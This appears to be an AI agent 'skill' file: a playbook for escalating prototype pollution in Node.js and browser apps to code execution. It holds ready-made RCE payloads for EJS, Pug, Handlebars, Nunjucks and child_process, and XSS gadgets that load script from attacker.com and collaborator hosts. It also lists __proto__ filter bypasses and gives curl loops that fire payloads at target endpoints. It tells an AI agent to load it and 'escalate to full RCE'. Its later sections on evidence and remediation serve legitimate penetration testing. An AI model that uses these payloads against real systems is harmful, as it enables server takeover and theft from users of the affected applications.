---
name: prototype-pollution-advanced
description: >-
  Advanced prototype pollution playbook — server-side RCE, client-side gadgets, filter bypasses, and detection techniques. Companion to ../prototype-pollution/ for basics. Use when you've confirmed pollution and need to escalate to code execution or find framework-specific gadgets.
---

# SKILL: Prototype Pollution Advanced — RCE & Gadget Exploitation

> **AI LOAD INSTRUCTION**: Advanced prototype pollution escalation. Covers server-side RCE via template engines (EJS, Pug, Handlebars), Node.js child_process gadgets, client-side script gadgets, filter bypass patterns, and systematic detection. Load [../prototype-pollution/SKILL.md](../prototype-pollution/SKILL.md) first for fundamentals (merge sinks, `__proto__` vs `constructor.prototype`, basic probes).

## 0. RELATED ROUTING

- [prototype-pollution](../prototype-pollution/SKILL.md) — **LOAD FIRST** for PP fundamentals, merge-sink detection, basic probes
- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) — template engine RCE context (PP often triggers through template gadgets)
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) — client-side PP gadgets ultimately achieve XSS

### Advanced Reference

Load [KNOWN_GADGETS.md](./KNOWN_GADGETS.md) for the comprehensive gadget table by framework/library with polluted properties, trigger conditions, impact, and affected versions.

---

## 1. SERVER-SIDE PP → RCE

### 1.1 Node.js child_process.spawn — Shell/ENV Injection

When `child_process.spawn` or `child_process.fork` is called without explicit `env`/`shell` options, it inherits from `Object.prototype`:

```javascript
// Vulnerable pattern (very common):
const { execSync } = require('child_process');
execSync('ls');  // inherits shell, env from prototype

// Pollution for RCE:
Object.prototype.shell = '/proc/self/exe';
Object.prototype.argv0 = 'console.log(require("child_process").execSync("id").toString())//';
Object.prototype.NODE_OPTIONS = '--require /proc/self/cmdline';
// Next child_process call executes attacker code
```

Alternative ENV pollution:

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

### 1.2 EJS (Embedded JavaScript Templates)

EJS `render()` reads `opts` from object properties. Polluting `outputFunctionName` injects code into the compiled template function:

```json
// Pollution payload:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// When EJS renders ANY template after pollution:
// Compiled function includes: var x;process.mainModule.require('child_process').execSync('id');s = "";
// → RCE
```

Detection: any EJS `res.render()` call after pollution triggers it.

### 1.3 Pug (formerly Jade)

Pug's compiler reads `block` from object properties:

```json
{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
```

Alternative via `self` option:

```json
{"__proto__": {"self": true, "line": "x]});process.mainModule.require('child_process').execSync('id');//"}}
```

### 1.4 Handlebars

Handlebars template compilation checks `type` and `program` on template AST nodes:

```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "original": "constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()","parts": ["constructor","constructor"]}, "params": [], "hash": null}]}}
```

Simpler via `allowProtoMethodsByDefault`:

```json
{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}
// Then use {{#with this as |obj|}}{{obj.constructor.constructor "return process.mainModule.require('child_process').execSync('id')"}}{{/with}}
```

### 1.5 Nunjucks

```json
{"__proto__": {"type": "Code", "value": "global.process.mainModule.require('child_process').execSync('id')"}}
```

### 1.6 Express res.render (Generic)

When Express calls `res.render()`, options merge with `app.locals` and `res.locals`. Polluted prototype properties appear as template variables:

```json
{"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}}
```

---

## 2. CLIENT-SIDE PROTOTYPE POLLUTION

### 2.1 jQuery Gadgets

`$.extend(true, {}, userInput)` performs deep merge — classic PP sink.

After pollution, jQuery's HTML methods use polluted properties:

```javascript
// Pollution:
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// Trigger: any jQuery DOM manipulation that reads innerHTML from prototype
$('<div>').appendTo('body');  // may use polluted property
```

### 2.2 Lodash Gadgets

```javascript
// Vulnerable functions (deep merge):
_.merge({}, userInput)
_.defaultsDeep({}, userInput)
_.set(obj, path, value)  // if path is attacker-controlled

// template() gadget:
Object.prototype.sourceURL = '\u000ajavascript:alert(1)//';
_.template('hello')();  // sourceURL injected into Function constructor
```

### 2.3 Script Gadgets in Frameworks

"Script gadgets" are framework code paths that read from `Object.prototype` and perform dangerous operations:

| Framework | Gadget Pattern | Polluted Property | Impact |
|---|---|---|---|
| jQuery | `$.html()`, element creation | `innerHTML`, `src` | XSS |
| Angular.js | `$interpolate` | `__defineGetter__` | XSS |
| Vue.js | Template compilation | `template`, `render` | XSS |
| Ember.js | Component rendering | Various view properties | XSS |
| Backbone.js | `_.template` | `sourceURL` | XSS |

### 2.4 DOM Property Pollution

```javascript
Object.prototype.src = 'https://attacker.com/evil.js';
Object.prototype.href = 'javascript:alert(1)';
Object.prototype.action = 'https://attacker.com/phish';
// Any dynamically created element may inherit these
```

---

## 3. DETECTION TECHNIQUES

### 3.1 Black-Box Server-Side Detection

```
Step 1: Inject and check
  POST /api/endpoint
  {"__proto__":{"polluted":"yes"}}
  
  Then: GET /api/anything
  Check if response contains "polluted" or behavior changes

Step 2: Error-based detection
  {"__proto__":{"toString":1}}
  → If server crashes or returns 500, toString was overwritten
  
  {"__proto__":{"valueOf":1}}
  → Same crash-based detection

Step 3: Response differential
  {"__proto__":{"status":555}}
  → Check if HTTP status code changes to 555
  
  {"__proto__":{"content-type":"text/plain"}}
  → Check if Content-Type header changes
```

### 3.2 Black-Box Client-Side Detection

```javascript
// In browser console after interacting with the app:
Object.prototype.testPollution
// If returns a value → something polluted the prototype

// Automated: override defineProperty to detect writes
Object.defineProperty(Object.prototype, '__proto__', {
    set: function(v) { console.trace('PP detected!', v); }
});
```

### 3.3 Automated Tools

| Tool | Type | Purpose |
|---|---|---|
| **PPScan** | Burp Extension | Scans for server-side PP |
| **server-side-prototype-pollution** | Burp Extension (Gareth Heyes) | Advanced server-side PP detection with multiple techniques |
| **ppfuzz** | CLI | Fuzz for client-side PP via URL fragment/query |
| **ppmap** | CLI | Map client-side PP to known gadgets |

---

## 4. BYPASS `__proto__` FILTERS

### 4.1 constructor.prototype Path

```json
// Instead of:
{"__proto__": {"polluted": "yes"}}

// Use:
{"constructor": {"prototype": {"polluted": "yes"}}}
```

### 4.2 Bracket Notation Variants

```
?constructor[prototype][polluted]=yes
?__proto__[polluted]=yes
?__pro__proto__to__[polluted]=yes   (if filter strips __proto__ once)
```

### 4.3 JSON Key Variations

```json
{"__proto__": {"a": 1}}
{"constructor": {"prototype": {"a": 1}}}
{"__proto__\u0000": {"a": 1}}
```

### 4.4 Key Distinction: Shallow vs Deep

`Object.assign` does NOT pollute prototype (shallow copy, safe). Only recursive/deep merge functions are vulnerable. Always verify the merge depth.

---

## 5. EXPLOITATION FLOW

```
1. Find merge sink (../prototype-pollution/SKILL.md Section 0)
   └── JSON body parsed and deep-merged into server object

2. Confirm pollution:
   └── {"__proto__":{"testxyz":"1"}} → check if testxyz appears globally

3. Identify technology stack:
   ├── Express + EJS → outputFunctionName gadget (Section 1.2)
   ├── Express + Pug → block gadget (Section 1.3)
   ├── Express + Handlebars → type/program gadget (Section 1.4)
   ├── Any Node.js with child_process → shell/NODE_OPTIONS (Section 1.1)
   ├── Client-side jQuery → DOM gadgets (Section 2.1)
   ├── Client-side Lodash → template/sourceURL (Section 2.2)
   └── Unknown → try KNOWN_GADGETS.md systematically

4. Craft RCE/XSS payload matching gadget

5. Verify with safe payload first (sleep / DNS callback)

6. Escalate to full RCE
```

---

## 6. DECISION TREE

```
Confirmed prototype pollution?
│
├── Server-side or client-side?
│   │
│   ├── SERVER-SIDE
│   │   ├── Template engine in use?
│   │   │   ├── EJS → __proto__.outputFunctionName (Section 1.2)
│   │   │   ├── Pug → __proto__.block (Section 1.3)
│   │   │   ├── Handlebars → __proto__.type (Section 1.4)
│   │   │   ├── Nunjucks → __proto__.type (Section 1.5)
│   │   │   └── Unknown → try each gadget from KNOWN_GADGETS.md
│   │   │
│   │   ├── child_process used anywhere?
│   │   │   ├── YES → __proto__.shell + NODE_OPTIONS (Section 1.1)
│   │   │   └── MAYBE → inject and trigger error to reveal stack
│   │   │
│   │   └── No known gadget?
│   │       ├── Try status code pollution: __proto__.status = 555
│   │       ├── Try header pollution: __proto__.content-type
│   │       └── Check KNOWN_GADGETS.md for framework match
│   │
│   └── CLIENT-SIDE
│       ├── jQuery loaded?
│       │   ├── YES → $.extend deep merge + DOM gadgets (Section 2.1)
│       │   └── Check ppmap for automated gadget detection
│       │
│       ├── Lodash loaded?
│       │   ├── YES → _.template sourceURL gadget (Section 2.2)
│       │   └── _.merge as both sink AND gadget
│       │
│       └── Framework (Angular/Vue/Ember)?
│           └── Script gadget lookup (Section 2.3)
│
├── __proto__ keyword filtered?
│   ├── Try constructor.prototype (Section 4.1)
│   ├── Try bracket notation (Section 4.2)
│   └── Try JSON key variations (Section 4.3)
│
└── Not confirmed yet?
    └── Go back to ../prototype-pollution/SKILL.md for detection
```

---

## 7. QUICK REFERENCE — KEY PAYLOADS

```json
// EJS RCE
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}

// Pug RCE
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('id');//"}}}

// child_process RCE (Node.js)
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}

// Lodash template XSS
{"__proto__":{"sourceURL":"\u000ajavascript:alert(1)//"}}

// Filter bypass (constructor path)
{"constructor":{"prototype":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}}

// Safe detection probe
{"__proto__":{"pptest123":"polluted"}}
```

---

## 8. EXECUTION PRIMITIVES

The advanced layer is about **gadgets**: which polluted key reaches code execution or privilege. Each
block targets one gadget family and demands a marker as proof.

### 8.1 Gadget survey from the source tree

```bash
# server-side gadget candidates: options objects handed to child_process, templates, or HTTP clients
grep -rnE 'child_process|spawn\(|exec\(|execSync|fork\(' --include='*.js' . | head -20
grep -rnE '\.(merge|defaultsDeep|set|setWith|extend)\(|_\.[a-z]*merge' --include='*.js' . | head -20
grep -rnE "require\((['\"])(lodash|qs|deep-extend|hoek|merge|dot-prop|set-value|mixin-deep)" --include='*.js' . | head -20
# and the version of each - the vulnerable ones are known and documented
node -e "for (const m of ['lodash','qs','deep-extend','merge','dot-prop']) {
  try { console.log(m, require(m+'/package.json').version); } catch(e){} }" 2>/dev/null
```

A merge helper at a vulnerable version **plus** a sink that reads an options object is the whole
server-side exploit. Identify both halves before writing a payload.

### 8.2 The `child_process` option gadget, with a marker

```bash
# seed the option keys a spawn/exec call would inherit from a polluted prototype
for B in \
  '{"__proto__":{"shell":"/bin/sh","argv0":"sh"}}' \
  '{"__proto__":{"shell":"node"}}' \
  '{"__proto__":{"env":{"PP_MARKER":"1"},"NODE_OPTIONS":"--no-warnings"}}' \
  '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ"}}' ; do
  echo "=== $B"
  curl -sS -o /dev/null -w '  seed %{http_code}\n' -X POST "https://target.tld/api/settings" \
    -H 'Content-Type: application/json' -d "$B"
  # trigger the endpoint whose handler spawns - the trigger is app-specific
  curl -sS -X POST "https://target.tld/api/convert" -H 'Content-Type: application/json' \
    -d '{"input":"marker-test"}' | head -c 200; echo
done
```

The marker is mandatory: a shell that ran an empty command produced no visible difference. Use a
payload whose **effect you can read** (an env var echoed into output, a file created under `/tmp` you
can then request, a DNS lookup to your collaborator).

### 8.3 The EJS/Pug/Handlebars option gadget

```bash
# template engines take a compile/render options object - pollution reaches `outputFunctionName`,
# `client`, `compileDebug`, and in some versions `escapeFunction`
BODY='{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"id\");s"}}'
curl -sS -o /dev/null -w 'seed %{http_code}\n' -X POST "https://target.tld/api/settings" \
  -H 'Content-Type: application/json' -d "$BODY"
curl -sS "https://target.tld/render?tpl=hi" -H "Cookie: $COOKIE" | head -c 300
# check the engine version - the gadget is version specific
curl -sS "https://target.tld/render?tpl=hi" -H "Cookie: $COOKIE" | grep -oiE 'ejs|pug|handlebars' | head -2
```

Template-engine gadgets are the most reliably exploitable server-side path because the options object
is usually built from a config that a merge can reach. **Quote the engine version**; without it the
claim is unverifiable.

### 8.4 Client-side gadget: DOM sink reachable from a polluted key

```bash
# the client-side gadget is a property READ the app trusts, e.g. an options object for a library
cat > /tmp/gadget.html <<'HTML'
<!doctype html><meta charset=utf-8>
<script>
// simulate a polluted prototype
Object.defineProperty(Object.prototype, "src", {value:"https://COLLAB/x.js", writable:true, configurable:true});
// a library-style gadget: it reads options.src and injects a script
function loadWidget(options){ var s=document.createElement("script"); s.src = options.src || "/default.js"; document.head.append(s); }
loadWidget({});   // the app passes an EMPTY options object - the value comes from the prototype
</script>
HTML
echo "serve it and watch the collaborator for a request to /x.js - that is the gadget firing"
```

The pattern to look for in a real app is **a call with an empty or partial options object** where a
library reads a missing key. That is the gadget, and it is a source-reading exercise, not a payload
guessing exercise.

### 8.5 DOM clobbering as the client-side alternative

```bash
# when prototype pollution is filtered, clobbering gives a similar effect via named elements
cat > /tmp/clobber.html <<'HTML'
<!doctype html><meta charset=utf-8>
<form id="config"><input name="src" value="https://COLLAB/c.js"></form>
<script>
// the app expects window.config.src; the form supplies it
var s = document.createElement("script");
s.src = (window.config && config.src) || "/default.js";
document.head.append(s);
</script>
HTML
echo "serve /tmp/clobber.html and check the collaborator - clobbering reached the same sink without pollution"
```

Clobbering is the fallback when `__proto__` is filtered on the client. The sink is identical; the
delivery differs. **Test both** on the same sink before concluding the client side is protected.

### 8.6 Filter bypass for `__proto__` specifically

```bash
for K in '__proto__' 'constructor' 'prototype' '__pro__to__' '__proto__%00' '__PROTO__' \
         '\u005f\u005fproto\u005f\u005f' '__proto__ ' ' __proto__'; do
  BODY="{\"$K\":{\"pp_probe\":\"yes\"}}"
  curl -sS -o /dev/null -w "seed $K %{http_code}\n" -X POST "https://target.tld/api/settings" \
    -H 'Content-Type: application/json' -d "$BODY"
  R=$(curl -sS -X POST "https://target.tld/api/echo" -H 'Content-Type: application/json' -d '{}')
  echo "  observable: $(echo "$R" | grep -c pp_probe)"
done
```

Unicode escapes, case variants, and whitespace padding slip past naive string filters while the JSON
and JS parsers still resolve them to the same key. **The observable check after each seed is what
tells you which one worked** - do not assume from the status code.

### 8.7 Confirm process-wide scope and cross-user reach

```bash
# seed once, then observe from a CLEAN session with no cookies of your own
curl -sS -o /dev/null -X POST "https://target.tld/api/settings" -H 'Content-Type: application/json' \
  -d '{"__proto__":{"pp_probe":"yes"}}'
curl -sS "https://target.tld/api/public" -H 'Cookie: ' | head -c 200
curl -sS --no-keepalive "https://target.tld/api/public" -H 'Cookie: ' | head -c 200
```

If an **unauthenticated, cookie-less** request observes the property, the pollution affects every
user of that process. That is the difference between a medium and a critical, and it is one request
away from being established.

### 8.8 Test whether a restart clears it, and note the persistence window

```bash
# poll until the marker disappears - that tells you the process lifetime and the blast window
for i in $(seq 1 20); do
  R=$(curl -sS "https://target.tld/api/public" | grep -c pp_probe)
  echo "t+$((i*15))s marker=$R"
  [ "$R" = "0" ] && { echo "cleared - process recycled"; break; }
  sleep 15
done
```

The persistence window is part of the impact statement: a marker that survives five minutes affects
every request in that window, across all users. Record it rather than asserting "process-wide"
without a measurement.

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the **gadget fire** - a marker appeared in output, a collaborator received a request, a file was created? | the impact; pollution alone is a lead |
| 2 | Is the gadget a **code path in the target**, named by file or endpoint, not a lab simulation? | a simulated gadget proves nothing about the target |
| 3 | Is the affected **library version** the vulnerable one, and quoted? | gadgets are version-specific |
| 4 | Did the effect reach a **clean, cookie-less session**? | cross-user impact, and the severity justification |
| 5 | For RCE: is there a **marker in the spawned process's output**? | the only acceptable RCE proof |
| 6 | For client-side: did the payload survive the **real app's** merge path and reach a DOM sink? | a lab page is not the target |
| 7 | If the filter was bypassed, which **variant** passed, and does the observable confirm it? | the fix must cover the variant that worked |

**A gadget is a code path you executed.** Reasoning that a library *would* read a key is not
confirmation; the marker is. If you have pollution and no executed gadget, report it as pollution
with a suspected gadget, clearly labelled.

---
### The control pair — the gadget must fire in the polluted world ONLY

This domain's whole subject is the gadget, so the control has to isolate the gadget, not just
the pollution.

| # | Run | Expected |
|---|---|---|
| A | **baseline** — the gadget's trigger, with **no** pollution | the gadget's observable is absent |
| B | **polluted + trigger** — pollution, then the same trigger | the observable appears |
| C | **polluted, trigger withheld** | the observable remains absent |
| D | **pollution flipped off, trigger sent** | absent again |

**A and B are the pair.** C and D exist to rule out the two ways this is usually faked:
the observable appearing before the trigger (C), or appearing without the pollution (D).

### The four things that must be ruled out before calling it a gadget

1. **Reflected input.** Search the baseline response for your payload string. If it is there,
   what you are seeing is an echo. A gadget proves itself by an effect the payload never
   contained - a file, a request arriving at your collector, a marker in a spawned process.
2. **A pre-existing behaviour.** Run the trigger with a **random, unrelated** property set in
   the same place. If the observable still appears, the pollution is not the cause.
3. **Library version drift.** The gadget is version-specific. Record the version you saw it on
   **and** run the pair on a version where the gadget is patched - the pair must break.
4. **Your own simulation.** If the "gadget" is a route you wrote, it proves your understanding
   and nothing about the target. Name the target's own file or endpoint.

### Out-of-band gadgets are the strongest control

Where the gadget causes an outbound action, the proof is the **request arriving at a collector
you control** - not the response body. That single inbound hit simultaneously proves
reachability, the merge path, and the gadget, and it cannot be produced by reflection.
If your gadget has no out-of-band observable, say so, and scope the finding to the in-band
effect you actually saw.

**The rule:** a gadget is confirmed when the marker appears in the polluted run and in **no**
other run. If the marker also appears in the baseline, you have found normal application
behaviour, not a gadget.

---

## 10. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **seed request** and the **observable request**, as separate exchanges | persistence is the difference between pollution and reflection |
| The **gadget's identity** - file, line, endpoint, and the library version | impact and the fix target |
| The **marker** and where it appeared (output, collaborator log, created file) | proof of execution |
| The **scope measurement** - clean-session observation and the persistence window | severity and blast radius |
| The **variant that bypassed the filter**, quoted | the fix must cover it specifically |
| The **stack trace** for a client-side gadget | names the merge path and library |
| The **runtime and framework versions** for every library named | gadget availability is version-bound |
| **Negative control** - a benign key does not fire the gadget, and a fresh object is clean before the seed | causation |
| An explicit statement of what was **not** achieved | honest scoping prevents an over-claimed severity |
| Confirmation that no destructive or persistence-installing payload was used | scope discipline |

Report the **executed chain**: "`POST /api/settings` pollutes `Object.prototype.outputFunctionName`;
the subsequent `GET /render` returns the output of `id` because EJS 3.1.6 reads that key into its
compile options (`node_modules/ejs/lib/ejs.js:626`); an unauthenticated request from a separate
connection received the same polluted behaviour, and the marker persisted for 4m20s until the worker
recycled", never "prototype pollution can lead to RCE".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A gadget that fired only in a page or script you wrote | tests your code |
| Reasoning that a library reads a key, with no execution | unproven |
| A vulnerable library version present but **not reachable** from user input | no path |
| A merge helper that filters `__proto__` correctly | the control worked |
| A `500` from the payload rather than a marker | a crash is not RCE |
| Pollution you established only in your own console | no delivery vector |
| An RCE claim without a marker in process output | not demonstrated |
| Marker observed only in the request that carried the payload | reflection |
| A client-side gadget that needs a URL you can only set yourself | no victim |
| A library that reads the key but only into a non-security-relevant value | no impact |
| A payload requiring a debug build or a development flag | not the production configuration |
| A restart-cleared effect reported as persistent | state it accurately |

**Marker or it did not happen.** RCE claims without an observable marker are the most damaging error
in this domain.

---

## 11. REMEDIATION REFERENCE

1. **Upgrade the merge and utility libraries past their advisories and pin them** - most gadgets here are a known-vulnerable `lodash`, `qs`, `dot-prop`, or `set-value`; the version is often the entire finding.
2. **Construct `child_process` options explicitly from validated scalars** - never pass a merged config object into `spawn`/`exec`; the option object is the gadget surface, and building it field by field removes it.
3. **Pass explicit options to template engines rather than a shared config object** - `outputFunctionName`, `client`, and `compileDebug` are only reachable when the engine merges a caller-supplied object.
4. **Reject unknown keys with a strict schema at every boundary** - an allowlist body schema stops the seed before it reaches a merge, and it covers nested variants that a filter misses.
5. **Use `Object.create(null)` for merged configuration, and freeze prototypes** - the two structural controls that remove the class rather than filter an instance.
6. **Guard security-relevant property reads with `hasOwnProperty`** - a read that only accepts own properties ignores a polluted prototype, which is often the last line of defence.
7. **Run Node with `--disable-proto=throw`** - it converts the silent write into an exception, exposing the vector during testing rather than in production.
8. **Isolate and recycle request-handling workers** - process-wide pollution is bounded by process lifetime; recycling shrinks the window in which another user inherits the payload.
9. **Treat `lodash`-style deep merge as a security-sensitive dependency** - track advisories for it specifically in your dependency policy, not just for the framework.
10. **Audit client-side libraries for calls with partial option objects** - the client gadget is a library reading a missing key; passing complete options or using defaults explicitly closes it.
11. **Add a regression test that seeds a payload and asserts a fresh object is clean** - it detects the class and any gadget reintroduced by a dependency upgrade.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [prototype-pollution](../prototype-pollution/SKILL.md) - the detection and mechanism foundation
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) - the sink the server-side gadget reaches
- [deserialization-insecure](../deserialization-insecure/SKILL.md) - the neighbouring object-graph-to-code class
- [xss-exploitation-chains](../xss-exploitation-chains/SKILL.md) - the sink a client-side gadget usually reaches
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) - encoding variants for the filtered keys
